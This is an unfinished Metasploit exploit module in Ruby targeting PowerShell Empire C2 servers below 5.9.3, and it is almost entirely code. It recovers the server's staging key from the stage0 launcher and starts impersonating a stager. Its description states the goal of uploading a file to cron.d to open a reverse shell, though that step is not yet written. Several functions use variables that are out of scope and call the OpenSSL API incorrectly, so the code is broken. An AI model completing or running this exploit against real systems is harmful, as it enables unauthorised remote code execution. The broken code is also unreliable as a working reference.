class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
  	include Msf::Exploit::FileDropper

	# TODO get hash where vunerability was fixed
	# TODO create test docker container of empire 
	# TODO payload, targets, platform
	# Break POC down into small steps, mostly concerned with foregry of stages first

	# todo info not working

	# TODO verify the staging key has been recovered with a vunerable commit. 
	def initialize(info={})
		super(
			update_info(
				info,
				'Name' => 'PowerShellEmpire Arbitrary file Upload (Millennium Falcon)',

				'Description' => %q{This module exploits a vulnerability in PowerShellEmpire < 5.9.3 
					which allows for RCE via arbitary file uploads. This module will upload a file to the cron.d 
					directory to spawn a reverse shell. Thank you to AceResponder for the discovery of 
					this vunerability and original POC; and of course thank you to h00die for the module suggestion },

					'Author' => [
						'Ace Responder', # Original exploit discovery and POC
						'gardnerapp' # Metasploit module
					], 

					'License' => MSF_LICENSE,
					'References' => [
						'https://aceresponder.com/blog/exploiting-empire-c2-framework',
						'https://github.com/ACE-Responder/Empire-C2-RCE-PoC',
					],
					'Payload'         =>
					        {
					          'DisableNops' => true,
					        },
				      'Platform'        => %w{ linux python },
				      'Targets'         =>
				        [
				          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ],
				          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
				          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ]
				        ],
				))

			register_options(
				[
					Opt::RPORT(80),
					OptString.new("TARGETURI", [ false, 'Base URI path', '/']),
					OptString.new("STAGE0_URI", [ true, 'Resource request by initial launcher, default is /download/python', '/download/python']),
				])
	end 


	# Recovers the staging key, spoofs step0 of stager process
	# Staging URI is subject to change
	def get_staging_key
		res = send_request_cgi!({
			'method' => 'GET',
			'uri' => normalize_uri(target_uri.path, datastore['STAGE0_URI'])
		})

		return unless res && res.code == 200
		
		staging_key = res.body.match(/key=IV\+\'(.*)\'\.encode/).to_s.delete_prefix!("key=IV+'").delete_suffix!("'.encode")
		#puts staging_key
		staging_key
	end 

	def check
    	return Exploit::CheckCode::Safe if get_staging_key.nil?

    	Exploit::CheckCode::Appears
  	end

  	def generate_pub_key
  		dif = OpenSSL::PKey::DH.new(2048)
  		public_key = dif.to_s.encode('UTF-8')
  		puts public_key
  		public_key
  	end 

  	def aes_encrypt(key,data,hmac=true)
  		cipher = OpenSSL.cipher.new 'aes-256-cbc'
  		cipher.iv_len=16
  		iv = cipher.random_iv
  		cipher.iv = iv
  		cipher.key=staging_key
  		data = iv + cipher.update(data) + cipher.final
  		puts data

  		# generate hmac from pubkey w staging key as k
  		mac = OpenSSL::HMAC.hexdigest  "SHA256", staging_key, public_key
  		puts mac
  		data << mac 
  		puts data
  		data
  	end 

  	def stage1(staging_key, public_key)
  		# encrypt pub key as data with staging key as aes k
  		data = aes_encrypt(staging_key, public_key)
  	end

	def exploit
		#todo get these to print
		print_status("Attempting to recover staging key....")
		# grab the staging key from the server and start spoofing as a stager
		staging_key = get_staging_key

		fail_with(Failure::Unknown, 'Failed to recover staging key.') if staging_key.nil?

		print_good("Recovered staging key #{staging_key} !")

		pub_key = generate_pub_key
		stage1(staging_key, pub_key)
	end 
end 